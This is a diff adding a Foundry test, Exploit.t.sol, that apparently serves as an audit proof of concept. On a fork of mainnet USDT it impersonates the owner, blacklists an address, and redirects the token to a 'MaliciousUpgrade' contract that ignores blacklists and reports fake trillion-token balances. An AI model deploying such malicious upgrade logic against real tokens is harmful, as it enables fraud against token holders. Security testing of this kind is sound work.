@@ -1,0 +1,118 @@
+```solidity
+// Exploit.t.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+interface ITetherToken {
+    function owner() external view returns (address);
+    function addBlackList(address _evilUser) external;
+    function removeBlackList(address _clearedUser) external;
+    function deprecate(address _upgradedAddress) external;
+    function transfer(address _to, uint256 _value) external;
+    function transferFrom(address _from, address _to, uint256 _value) external;
+    function balanceOf(address who) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function isBlackListed(address) external view returns (bool);
+    function paused() external view returns (bool);
+    function unpause() external;
+    function upgradedAddress() external view returns (address);
+    function deprecated() external view returns (bool);
+    function issue(uint256 amount) external;
+}
+
+// A minimal malicious upgrade contract that ignores blacklists and returns arbitrary balances.
+contract MaliciousUpgrade {
+    function transferByLegacy(address /*from*/, address /*to*/, uint256 /*value*/) public {
+        // no-op, bypasses any checks
+    }
+
+    function transferFromByLegacy(address /*sender*/, address /*from*/, address /*spender*/, uint256 /*value*/) public {
+        // no-op
+    }
+
+    function approveByLegacy(address /*from*/, address /*spender*/, uint256 /*value*/) public {
+        // no-op
+    }
+
+    function balanceOf(address /*who*/) external pure returns (uint256) {
+        return 1_000_000_000_000 * 1e18; // 1 trillion tokens
+    }
+
+    function totalSupply() external pure returns (uint256) {
+        return 1_000_000_000_000 * 1e18;
+    }
+
+    function allowance(address, address) external pure returns (uint256) {
+        return 1_000_000_000_000 * 1e18;
+    }
+}
+
+contract ExploitTest is Test {
+    ITetherToken constant usdt = ITetherToken(0xdac17f958d2ee523a2206206994597c13d831ec7);
+    address constant BLACKLISTED_USER = address(0xdead);
+    address maliciousUpgrade;
+
+    function setUp() public {
+        vm.label(address(usdt), "USDT");
+        vm.label(BLACKLISTED_USER, "BlacklistedUser");
+
+        // Ensure the contract is not paused for test simplicity
+        if (usdt.paused()) {
+            address owner = usdt.owner();
+            vm.startPrank(owner);
+            usdt.unpause();
+            vm.stopPrank();
+        }
+    }
+
+    function testUpgradeableContractsCentralization() public {
+        address owner = usdt.owner();
+        vm.label(owner, "Owner");
+
+        // Give some tokens to the blacklisted user so that transfer call can proceed if not blacklisted
+        // We use deal to give USDT tokens (6 decimals)
+        uint256 amount = 1000 * 1e6; // 1000 USDT
+        deal(address(usdt), BLACKLISTED_USER, amount);
+        assertEq(usdt.balanceOf(BLACKLISTED_USER), amount);
+
+        // Owner adds blacklisted user to blacklist
+        vm.prank(owner);
+        usdt.addBlackList(BLACKLISTED_USER);
+        assertTrue(usdt.isBlackListed(BLACKLISTED_USER));
+
+        // Blacklisted user's transfer should revert (due to blacklist check)
+        vm.prank(BLACKLISTED_USER);
+        vm.expectRevert();
+        usdt.transfer(owner, amount);
+
+        // Deploy malicious upgrade contract
+        MaliciousUpgrade malicious = new MaliciousUpgrade();
+        maliciousUpgrade = address(malicious);
+        vm.label(maliciousUpgrade, "MaliciousUpgrade");
+
+        // Owner deprecates the current contract and points to the malicious upgrade
+        vm.prank(owner);
+        usdt.deprecate(maliciousUpgrade);
+        assertTrue(usdt.deprecated());
+        assertEq(usdt.upgradedAddress(), maliciousUpgrade);
+
+        // Now the blacklisted user can transfer (malicious upgrade ignores blacklist)
+        vm.prank(BLACKLISTED_USER);
+        usdt.transfer(owner, amount); // no revert
+
+        // Moreover, balanceOf now returns arbitrary huge value from the malicious upgrade
+        assertEq(usdt.balanceOf(BLACKLISTED_USER), 1_000_000_000_000 * 1e18);
+        assertEq(usdt.totalSupply(), 1_000_000_000_000 * 1e18);
+
+        // Demonstrate that the owner can also inflate supply arbitrarily
+        vm.prank(owner);
+        usdt.issue(1); // This calls on the original contract but totalSupply already overridden
+        // totalSupply is still from malicious upgrade, not affected by issue
+        assertEq(usdt.totalSupply(), 1_000_000_000_000 * 1e18);
+
+        // Ultimately, the contract's rules have been changed, all token logic now controlled by the malicious upgrade.
+    }
+}
+```
